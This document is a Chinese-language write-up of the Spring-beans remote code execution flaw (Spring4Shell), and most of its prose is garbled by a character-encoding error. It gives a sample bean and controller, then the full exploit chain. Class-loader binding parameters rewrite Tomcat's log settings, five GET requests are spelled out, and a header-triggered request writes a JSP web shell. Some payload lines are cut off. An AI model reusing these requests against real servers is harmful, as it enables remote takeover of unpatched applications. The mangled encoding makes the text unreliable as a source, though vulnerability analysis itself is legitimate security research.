Spring-beans RCEæ¼æ´åˆ†æ
1
ğŸ‘º
Spring-beans RCEæ¼æ´åˆ†æ
è¯´æ˜
è¦æ±‚æ¡ä»¶ï¼š
JDK9åŠå…¶ä»¥ä¸Šç‰ˆæœ¬ï¼›
ä½¿â½¤äº†Spring-beansåŒ…ï¼›
ä½¿â½¤äº†Springå‚æ•°ç»‘å®šï¼›
Springå‚æ•°ç»‘å®šä½¿â½¤çš„æ˜¯â¾®åŸºæœ¬å‚æ•°ç±»å‹ï¼Œä¾‹å¦‚â¼€èˆ¬çš„POJOå³å¯ï¼›
æµ‹è¯•ç¯å¢ƒ
https://github.com/p1n93r/spring-rce-war
æ¼æ´åˆ†æ
Springå‚æ•°ç»‘å®šä¸è¿‡å¤šä»‹ç»ï¼Œå¯â¾ƒâ¾ç™¾åº¦ï¼›å…¶åŸºæœ¬ä½¿â½¤â½…å¼å°±æ˜¯åˆ©â½¤ .  çš„å½¢å¼ï¼Œç»™å‚æ•°è¿›â¾èµ‹å€¼ï¼Œå®é™…èµ‹å€¼è¿‡ç¨‹ï¼Œä¼šä½¿â½¤åå°„è°ƒâ½¤å‚
æ•°çš„ getter  or setter  ï¼›
è¿™ä¸ªæ¼æ´åˆšçˆ†å‡ºæ¥çš„æ—¶å€™ï¼Œæˆ‘ä¸‹æ„æ€è®¤ä¸ºæ˜¯â¼€ä¸ªåƒåœ¾æ´ï¼Œå› ä¸ºæˆ‘è§‰å¾—éœ€è¦ä½¿â½¤çš„å‚æ•°å†…ï¼Œå­˜åœ¨â¼€ä¸ªClassç±»å‹çš„å±æ€§ï¼Œæ²¡æœ‰å“ªä¸ªå‚»é€¼å¼€
å‘ä¼šåœ¨POJOä¸­ä½¿â½¤è¿™ä¸ªå±æ€§ï¼›ä½†æ˜¯å½“æˆ‘è®¤çœŸè·Ÿä¸‹æ¥çš„æ—¶å€™ï¼Œå‘ç°äº‹æƒ…æ²¡è¿™ä¹ˆç®€å•ï¼›
ä¾‹å¦‚æˆ‘éœ€è¦ç»‘å®šçš„å‚æ•°çš„æ•°æ®ç»“æ„å¦‚ä¸‹ï¼Œå°±æ˜¯â¼€ä¸ªå¾ˆç®€å•çš„POJOï¼š
/** 
 * @author : p1n93r 
 * @date : 2022/3/29 17:34 
 */ 
@Setter 
@Getter 
public class EvalBean { 
    public EvalBean() throws ClassNotFoundException { 
        System.out.println("[+] è°ƒâ½¤äº†EvalBean.EvalBean"); 
    } 
    public String name; 
    public CommonBean commonBean; 
    public String getName() { 
        System.out.println("[+] è°ƒâ½¤äº†EvalBean.getName"); 
Spring-beans RCEæ¼æ´åˆ†æ
2
        return name; 
    } 
    public void setName(String name) { 
        System.out.println("[+] è°ƒâ½¤äº†EvalBean.setName"); 
        this.name = name; 
    } 
    public CommonBean getCommonBean() { 
        System.out.println("[+] è°ƒâ½¤äº†EvalBean.getCommonBean"); 
        return commonBean; 
    } 
    public void setCommonBean(CommonBean commonBean) { 
        System.out.println("[+] è°ƒâ½¤äº†EvalBean.setCommonBean"); 
        this.commonBean = commonBean; 
    } 
}
æˆ‘çš„Controllerå†™æ³•å¦‚ä¸‹ï¼Œä¹Ÿæ˜¯å¾ˆæ­£å¸¸çš„å†™æ³•ï¼š
@RequestMapping("/index") 
public void index(EvalBean evalBean, Model model){ 
    System.out.println("================="); 
    System.out.println(evalBean); 
    System.out.println("================="); 
}
äºæ˜¯æˆ‘å¼€å§‹è·Ÿå‚æ•°ç»‘å®šçš„æ•´ä¸ªæµç¨‹ï¼Œå½“æˆ‘è·Ÿåˆ°å¦‚ä¸‹è°ƒâ½¤ä½ç½®çš„æ—¶å€™ï¼Œæˆ‘æ„£ä½äº†ï¼š
å½“æˆ‘æŸ¥çœ‹è¿™ä¸ª cache  çš„æ—¶å€™ï¼Œæˆ‘æƒŠå‘†äº†ï¼Œä¸ºå•¥è¿™â¾¥ä¼šæœ‰â¼€ä¸ª class  å±æ€§ç¼“å­˜ï¼Ÿï¼Ÿï¼Ÿï¼ï¼ï¼ï¼ï¼
Spring-beans RCEæ¼æ´åˆ†æ
3
çœ‹åˆ°è¿™â¾¥æˆ‘å°±çŸ¥é“æˆ‘æ„è¯†é”™äº†ï¼Œè¿™ä¸æ˜¯â¼€ä¸ªåƒåœ¾æ´ï¼ŒçœŸçš„æ˜¯â¼€ä¸ªæ ¸å¼¹çº§åˆ«çš„æ¼æ´ï¼ç°åœ¨æ˜â½©äº†ï¼Œæˆ‘ä»¬å¾ˆç®€å•çš„å°±å¯ä»¥è·å–åˆ° class  å¯¹
è±¡ï¼Œé‚£å‰©ä¸‹çš„å°±æ˜¯åˆ©â½¤è¿™ä¸ª class  å¯¹è±¡æ„é€ åˆ©â½¤é“¾äº†ï¼Œâ½¬å‰â½è¾ƒç®€å•çš„â½…å¼ï¼Œå°±æ˜¯ä¿®æ”¹Tomcatçš„â½‡å¿—é…ç½®ï¼Œå‘â½‡å¿—ä¸­å†™â¼Šshellã€‚â¼€æ¡
å®Œæ•´çš„åˆ©â½¤é“¾å¦‚ä¸‹ï¼š
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7b%66%75%63%6b%7d%69 
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp 
class.module.classLoader.resources.context.parent.pipeline.first.directory=%48%3a%5c%6d%79%4a%61%76%61%43%6f%64%65%5c%73%74%75%70%69%64%52%7
class.module.classLoader.resources.context.parent.pipeline.first.prefix=fuckJsp 
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
çœ‹åˆ©â½¤é“¾å°±çŸ¥é“ï¼Œæ˜¯â¼€ä¸ªå¾ˆç®€å•çš„ä¿®æ”¹Tomcatâ½‡å¿—é…ç½®ï¼Œåˆ©â½¤â½‡å¿—å†™shellçš„â¼¿æ³•ï¼›å…·ä½“çš„æ”»å‡»æ­¥éª¤å¦‚ä¸‹ï¼Œå…ˆåå‘é€å¦‚ä¸‹5ä¸ªè¯·æ±‚ï¼š
http://127.0.0.1:8080/stupidRumor_war_exploded/index?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7b%66%75%6
http://127.0.0.1:8080/stupidRumor_war_exploded/index?class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp 
http://127.0.0.1:8080/stupidRumor_war_exploded/index?class.module.classLoader.resources.context.parent.pipeline.first.directory=%48%3a%5c%6d
http://127.0.0.1:8080/stupidRumor_war_exploded/index?class.module.classLoader.resources.context.parent.pipeline.first.prefix=fuckJsp 
http://127.0.0.1:8080/stupidRumor_war_exploded/index?class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
å‘é€å®Œæ¯•è¿™5ä¸ªè¯·æ±‚åï¼ŒTomcatçš„â½‡å¿—é…ç½®è¢«ä¿®æ”¹æˆå¦‚ä¸‹ï¼š
Spring-beans RCEæ¼æ´åˆ†æ
4
æ¥ç€æˆ‘ä»¬åªéœ€è¦éšä¾¿å‘é€â¼€ä¸ªè¯·æ±‚ï¼ŒåŠ â¼€ä¸ªå«fuckçš„headerï¼Œå³å¯å†™â¼Šshellï¼š
GET /stupidRumor_war_exploded/fuckUUUU HTTP/1.1 
Host: 127.0.0.1:8080 
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 
fuck:  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 
Accept-Encoding: gzip, deflate 
Connection: close 
Upgrade-Insecure-Requests: 1 
Sec-Fetch-Dest: document 
Sec-Fetch-Mode: navigate 
Sec-Fetch-Site: none 
Sec-Fetch-User: ?1
Spring-beans RCEæ¼æ´åˆ†æ
5
å¯ä»¥æ­£å¸¸è®¿é—®shellï¼š
æ€»ç»“
Spring-beans RCEæ¼æ´åˆ†æ
6
è¿™â¾¥æ—¢ç„¶å¯ä»¥è°ƒâ½¤åˆ°classå¯¹è±¡äº†ï¼Œé‚£ä¹ˆåˆ©â½¤â½…å¼è‚¯å®šä¸â½Œå†™â½‡å¿—è¿™â¼€ç§ï¼›
åç»­å¯ä»¥è·Ÿâ¼€ä¸‹ï¼Œä¸ºå•¥å‚æ•°ç»‘å®šè¿‡ç¨‹ä¸­ä¼šä¿ç•™â¼€ä¸ªPOJOçš„classå¼•â½¤ï¼Ÿ